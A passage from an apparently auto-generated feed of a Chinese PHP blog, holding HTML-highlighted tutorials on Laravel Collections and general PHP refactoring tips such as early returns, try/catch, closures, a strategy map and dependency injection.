class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方式一：</span></span><br><span class="line">$total_price = collect($orders)-&gt;map(<span class="function"><span class="keyword">function</span> <span class="params">($order)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $order[<span class="string">'price'</span>];</span><br><span class="line">&#125;)-&gt;sum();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方式二：</span></span><br><span class="line">$total_price = collect($orders)-&gt;pluck(<span class="string">"price"</span>)-&gt;sum();</span><br></pre></td></tr></table></figure></li></ol><h2 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$products = [</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span> =&gt; <span class="number">1</span>,</span><br><span class="line">        <span class="string">"brand"</span> =&gt; <span class="string">"iPhone"</span>,</span><br><span class="line">        <span class="string">"name"</span> =&gt; <span class="string">"iPhone 12"</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span> =&gt; <span class="number">2</span>,</span><br><span class="line">        <span class="string">"brand"</span> =&gt; <span class="string">"OPPO"</span>,</span><br><span class="line">        <span class="string">"name"</span> =&gt; <span class="string">"OPPO R11"</span>,</span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span> =&gt; <span class="number">3</span>,</span><br><span class="line">        <span class="string">"brand"</span> =&gt; <span class="string">"小米"</span>,</span><br><span class="line">        <span class="string">"name"</span> =&gt; <span class="string">"小米 11"</span>,</span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span> =&gt; <span class="number">2</span>,</span><br><span class="line">        <span class="string">"brand"</span> =&gt; <span class="string">"OPPO"</span>,</span><br><span class="line">        <span class="string">"name"</span> =&gt; <span class="string">"OPPO R12"</span>,</span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span> =&gt; <span class="number">3</span>,</span><br><span class="line">        <span class="string">"brand"</span> =&gt; <span class="string">"小米"</span>,</span><br><span class="line">        <span class="string">"name"</span> =&gt; <span class="string">"小米 10"</span>,</span><br><span class="line">    ],</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>使用集合：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$product = collect($products)-&gt;pluck(<span class="string">"brand"</span>);</span><br><span class="line"></span><br><span class="line">$grouped = collect($products)-&gt;groupBy(<span class="string">"id"</span>);</span><br><span class="line"></span><br><span class="line">$result = $product-&gt;map(<span class="function"><span class="keyword">function</span> <span class="params">($value, $key)</span> <span class="title">use</span> <span class="params">($grouped)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="string">"brand"</span> =&gt; $value,</span><br><span class="line">        <span class="string">"child"</span> =&gt; $grouped[$key],</span><br><span class="line">    ];</span><br><span class="line">&#125;)-&gt;values();</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://curder.gitbooks.io/laravel_study/content/collections_demo/" target="_blank" rel="noopener">collection在实际开发中的使用</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;这篇笔记用来整理Collection 在Laravel 的实际应用场景。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    <category term="Laravel" scheme="https://www.0x2beace.com/categories/PHP/Laravel/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Laravel" scheme="https://www.0x2beace.com/tags/Laravel/"/>
    
  </entry>
  
  <entry>
    <title>Tips of PHP</title>
    <link href="https://www.0x2beace.com/tips-of-php/"/>
    <id>https://www.0x2beace.com/tips-of-php/</id>
    <published>2021-04-28T14:28:49.000Z</published>
    <updated>2021-06-20T07:01:13.478Z</updated>
    
    <content type="html"><![CDATA[<p>Awesome tips for PHP.</p><a id="more"></a><h2 id="减少if…else-的使用"><a href="#减少if…else-的使用" class="headerlink" title="减少if…else 的使用"></a>减少if…else 的使用</h2><p><code>if...else</code> 通常是一个糟糕的选择，它导致设计复杂，代码可读性差，并且可能导致重构困难。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSomething</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (...) &#123;</span><br><span class="line">        <span class="keyword">if</span> (...) &#123;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125; esle &#123;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (...) &#123;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125; esle &#123;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好在可以通过其他方式可以避免对<code>if...else</code> 的过度依赖：</p><ol><li>提前 return：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">($input)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ($input &gt; <span class="number">5</span>)&#123;</span><br><span class="line">    <span class="comment">// do something </span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// do something else</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>只需要删除<code>else</code> 块，即可简化此过程：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">($input)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ($input &gt; <span class="number">5</span>)&#123;</span><br><span class="line">    <span class="comment">// do something </span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// do something else </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li><code>switch...case</code> 也是不错地选择：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">($input)</span></span>&#123;</span><br><span class="line">  <span class="keyword">switch</span>($input)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"A"</span>:</span><br><span class="line">      <span class="comment">// do something</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">case</span> <span class="string">"B"</span>:</span><br><span class="line">      <span class="comment">// do else something</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">      </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="使用try…catch"><a href="#使用try…catch" class="headerlink" title="使用try…catch"></a>使用try…catch</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserModel</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($username = <span class="string">''</span>, $password = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (...) &#123;</span><br><span class="line">            <span class="comment">// 用户不存在</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (...) &#123;</span><br><span class="line">            <span class="comment">// 密码错误</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">-2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// code...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($username = <span class="string">''</span>, $password = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $model = <span class="keyword">new</span> UserModel();</span><br><span class="line">        $res   = $model-&gt;login($username, $password);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ($res === <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> [</span><br><span class="line">                <span class="string">'code'</span> =&gt; <span class="string">'404'</span>,</span><br><span class="line">                <span class="string">'message'</span> =&gt; <span class="string">'用户不存在'</span></span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ($res === <span class="number">-2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> [</span><br><span class="line">                <span class="string">'code'</span> =&gt; <span class="string">'400'</span>,</span><br><span class="line">                <span class="string">'message'</span> =&gt; <span class="string">'密码错误'</span></span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// code...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用<code>try...catch</code> 重写：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserModel</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($username = <span class="string">''</span>, $password = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (...) &#123;</span><br><span class="line">            <span class="comment">// 用户不存在</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'用户不存在'</span>, <span class="string">'404'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (...) &#123;</span><br><span class="line">            <span class="comment">// 密码错误</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'密码错误'</span>, <span class="string">'400'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($username = <span class="string">''</span>, $password = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $model = <span class="keyword">new</span> UserModel();</span><br><span class="line">            $res   = $model-&gt;login($username, $password);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 如果需要的话，我们可以在这里统一commit数据库事务</span></span><br><span class="line">            <span class="comment">// $db-&gt;commit();</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        </span><br><span class="line">            <span class="comment">// 如果需要的话，我们可以在这里统一rollback数据库事务</span></span><br><span class="line">            <span class="comment">// $db-&gt;rollback();</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过使用<code>try...catch</code> 重写，使得代码逻辑职责分明、更加清晰。<code>try</code> 只用关心业务正常情况的处理，而所有异常则统一在<code>catch</code> 中处理，上游只需将异常抛出即可。</p><h2 id="使用匿名函数"><a href="#使用匿名函数" class="headerlink" title="使用匿名函数"></a>使用匿名函数</h2><p>需要在一个方法中，重复处理某个逻辑，这时可能会将其封装成一个函数，即：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSomething</span><span class="params">(...)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    format(...);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    format(...);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明一个格式化代码的函数或方法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">format</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 格式化代码段</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这段代码并没有什么问题，但是如果这个函数仅仅只在<code>doSomething</code> 中使用呢？更好地做法应该是这样：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSomething</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    $format = <span class="function"><span class="keyword">function</span> <span class="params">(...)</span> <span class="title">use</span> <span class="params">(...)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 格式化代码段</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    $format(...);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    $format(...);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="简单的策略模式"><a href="#简单的策略模式" class="headerlink" title="简单的策略模式"></a>简单的策略模式</h2><p>客户端在做决策时，通常会根据不同的上下文环境选择不同的策略，可能会写成下面这样：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">One</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">doSomething</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (...) &#123;</span><br><span class="line">            $instance = <span class="keyword">new</span> A();</span><br><span class="line">        &#125;　<span class="keyword">elseif</span> (...) &#123;</span><br><span class="line">            $instance = <span class="keyword">new</span> B();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $instance = <span class="keyword">new</span> C();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $instance-&gt;doSomething(...);</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这种情况，无论是使用<code>if...else</code>还是<code>switch...case</code> 当策略增多时，都会出现大量分支逻辑判断，好写的做法是定义一个简单的策略：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">One</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $map = [</span><br><span class="line">        <span class="string">'a'</span> =&gt; <span class="string">'namespace\A'</span>,</span><br><span class="line">        <span class="string">'b'</span> =&gt; <span class="string">'namespace\B'</span>,</span><br><span class="line">        <span class="string">'c'</span> =&gt; <span class="string">'namespace\C'</span></span><br><span class="line">    ];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">doSomething</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        $instance = <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;map[$strategy];</span><br><span class="line">        $instance-&gt;doSomething(...);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="依赖注入"><a href="#依赖注入" class="headerlink" title="依赖注入"></a>依赖注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">One</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $instance;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">$this</span>-&gt;intance = <span class="keyword">new</span> Two();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">doSomething</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (...) &#123;</span><br><span class="line">            <span class="comment">// 如果某种情况调用类Two的实例方法</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;instance-&gt;do(...);</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$instance = <span class="keyword">new</span> One();</span><br><span class="line">$instance-&gt;doSomething();</span><br></pre></td></tr></table></figure><p>上面这段代码有什么问题？</p><ol><li>不符合设计模式的最少知道原则，One 类内部直接依赖了Two 类。</li></ol><p>使用依赖注入重写此类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">One</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $closure;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(Closure $closure)</span></span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">$this</span>-&gt;closure = $closure;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">doSomething</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (...) &#123;</span><br><span class="line">            <span class="comment">// 用的时候再实例化</span></span><br><span class="line">            <span class="comment">// 实现懒加载</span></span><br><span class="line">            $instance = <span class="keyword">$this</span>-&gt;closure();</span><br><span class="line">            $instance-&gt;do(...)</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">$instance = <span class="keyword">new</span> One(<span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 从外部注入Two 类</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Two();</span><br><span class="line">&#125;);</span><br><span class="line">$instance-&gt;doSomething();</span><br></pre></td></tr></table></figure><h2 id="原文地址"><a href="#原文地址" class="headerlink" title="原文地址"></a>原文地址</h2><ul><li><a href="https://github.com/TIGERB/easy-tips/blob/master/php/artisan.md" target="_blank" rel="noopener">easy-tips/php</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;Awesome tips for PHP.&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Laravel Collection 基本使用</title>
    <link href="https://www.0x2beace.com/basic-use-of-collection-in-laravel/"/>
    <id>https://www.0x2beace.com/basic-use-of-collection-in-laravel/</id>
    <published>2021-04-25T15:17:05.000Z</published>
    <updated>2021-05-12T13:23:12.740Z</updated>
    
    <content type="html"><![CDATA[<p>集合是Laravel 中提供的最强大的功能之一，集合本质上是由功能强大的数组组成。</p><a id="more"></a><p>把类似数组的对象应用到方法中是很有用的，通过链式编程，用极短的代码，就可以达到预期的效果。</p><p>需要注意的是集合并不是Laravel 中独有的，许多语言都可以在数组中使用集合式编程，但非常遗憾，原生的PHP 是不支持集合式编程的，不过幸运的是，一些勤劳的人已经为我们完成了艰苦的工作，并编写了一个非常方便的包——<a href="https://github.com/illuminate/support" target="_blank" rel="noopener">illuminate/support</a>、<a href="https://github.com/tighten/collect" target="_blank" rel="noopener">Tightenco/Collect</a> 。</p><p>一般来说，集合是不可改变的，这意味着大部分 Collection 方法都会返回一个全新的 Collection 实例。</p><h2 id="创建集合"><a href="#创建集合" class="headerlink" title="创建集合"></a>创建集合</h2><p>为了创建一个集合，可以将一个数组传入集合的构造器中，也可以创建一个空的集合，然后把元素写到集合中。Laravel 有<code>collect()</code>助手，这是最简单的，新建集合的方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]);</span><br></pre></td></tr></table></figure><blockquote><p>默认情况下， Eloquent 查询的结果返回的内容都是 <code>Illuminate\Support\Collection</code> 实例，如果希望对结果进行序列化，可以使用<code>toArray()</code>、<code>toJson()</code> 方法。</p></blockquote><p>在非Laravel 项目中使用集合：</p><p>安装：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer <span class="keyword">require</span> illuminate/support</span><br></pre></td></tr></table></figure><p>使用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 引入package</span></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line">$collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]);</span><br><span class="line">var_dump($collection);</span><br></pre></td></tr></table></figure><p>记住，所有方法都可以使用链式编程的方式优雅的操纵数组。而且几乎所有的方法都会返回<strong>新的</strong> <code>Collection</code> 实例，</p><h2 id="all"><a href="#all" class="headerlink" title="all"></a>all</h2><p>返回该集合表示的底层数组。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">collect([<span class="string">"boo"</span>, <span class="string">"yumi"</span>, <span class="string">"mac"</span>])-&gt;all();</span><br><span class="line"><span class="comment">// [“boo”, "yumi", "mac"]</span></span><br></pre></td></tr></table></figure><h2 id="avg"><a href="#avg" class="headerlink" title="avg"></a>avg</h2><p>获取数组的平均值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">collect([<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span 